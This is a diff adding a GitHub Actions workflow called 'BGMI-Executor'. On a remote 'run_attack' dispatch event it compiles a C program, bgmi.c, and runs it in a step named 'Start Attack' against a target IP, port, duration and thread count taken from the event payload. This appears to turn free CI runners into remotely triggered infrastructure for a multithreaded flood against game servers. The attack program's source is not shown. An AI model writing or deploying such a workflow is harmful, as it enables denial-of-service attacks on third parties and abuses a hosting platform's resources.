@@ -1,0 +1,14 @@
+name: BGMI-Executor
+on:
+  repository_dispatch:
+    types: [run_attack]
+jobs:
+  execute:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v3
+      - name: Compile Script
+        run: gcc bgmi.c -o bgmi -lpthread && chmod +x bgmi
+      - name: Start Attack
+        run: ./bgmi ${{ github.event.client_payload.ip }} ${{ github.event.client_payload.port }} ${{ github.event.client_payload.time }} ${{ github.event.client_payload.thread }}
